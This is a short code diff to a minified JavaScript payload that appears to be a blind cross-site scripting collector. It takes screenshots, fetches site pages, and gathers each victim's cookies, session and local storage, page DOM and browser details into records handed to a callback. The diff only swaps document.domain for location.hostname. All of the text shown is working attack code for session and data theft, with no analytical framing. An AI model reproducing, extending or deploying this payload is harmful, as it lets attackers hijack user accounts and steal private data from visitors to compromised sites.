@@ -8,7 +8,7 @@ try{ez_rD.payload="{%data payload}"}catch(e){ez_rD.payload=""}try{html2canvas(do
 function ez_c(){ez_s(),ez_nW(),ez_cb(ez_rD),ez_cp()}}
 function ez_s(){var c=[{%data noCollect}];var i,l;for(i=0,l=c.length;i<l;++i){ez_rD[c[i]]="Not collected"}}
 function ez_cp(){var p=[{%data pages}];var q,r;for(q=0,r=p.length;q<r;++q){ez_dc(p[q])}}
-function ez_dc(e){try{var u="//"+location.hostname+e,x=new XMLHttpRequest;x.onreadystatechange=function(){4==x.readyState&&(cbdata={dom:ez_n(x.responseText),uri:ez_n(u),origin:ez_n(document.domain),referer:"Collected page via "+ez_n(location.toString()),cookies:ez_n(document.cookie),"user-agent":ez_n(navigator.userAgent),sessionstorage:ez_n(window.sessionStorage),localstorage:ez_n(window.localStorage),payload:"{%data payload}"},ez_cb(cbdata))},x.open("GET",u,!0),x.send(null)}catch(j){}}
+function ez_dc(e){try{var u="//"+location.hostname+e,x=new XMLHttpRequest;x.onreadystatechange=function(){4==x.readyState&&(cbdata={dom:ez_n(x.responseText),uri:ez_n(u),origin:ez_n(location.hostname),referer:"Collected page via "+ez_n(location.toString()),cookies:ez_n(document.cookie),"user-agent":ez_n(navigator.userAgent),sessionstorage:ez_n(window.sessionStorage),localstorage:ez_n(window.localStorage),payload:"{%data payload}"},ez_cb(cbdata))},x.open("GET",u,!0),x.send(null)}catch(j){}}
 function ez_aE(e,t,n){e.addEventListener?e.addEventListener(t,n,!1):e.attachEvent&&e.attachEvent("on"+t,n)}ez_rD={},"complete"==document.readyState?ez_hL():ez_aE(window,"load",function(){ez_hL()});
 function ez_nW(){try{ez_r()}catch(e){}}
 
